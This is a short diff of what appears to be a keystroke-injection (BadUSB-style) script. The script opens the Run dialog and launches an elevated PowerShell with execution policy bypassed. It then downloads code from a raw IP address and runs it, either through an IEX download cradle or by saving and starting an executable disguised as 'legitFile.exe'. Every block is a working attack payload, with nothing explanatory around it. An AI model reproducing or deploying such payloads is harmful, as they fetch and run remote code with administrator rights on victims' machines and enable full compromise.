@@ -1,9 +1,26 @@
 <windows+r>
 powershell -c "start-process powershell -verb runas -argumentlist '-ex bypass'"
 <enter>
-IEX (New-Object Net.WebClient).DownloadString('https://129.151.211.93:5000/download')
+$downloadUrl = "http://129.151.211.93:5000/download"
+<enter>
+$downloadPath = "C:\legitFile.exe"
+<enter>
+$executablePath = "C:\legitFile.exe"
+<enter>
+Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath
+<enter>
+Start-Process -FilePath $executablePath
 <enter>
 <end>
 
 
 
+
+
+
+<windows+r>
+powershell -c "start-process powershell -verb runas -argumentlist '-ex bypass'"
+<enter>
+IEX (New-Object Net.WebClient).DownloadString('https://129.151.211.93:5000/download')
+<enter>
+<end>
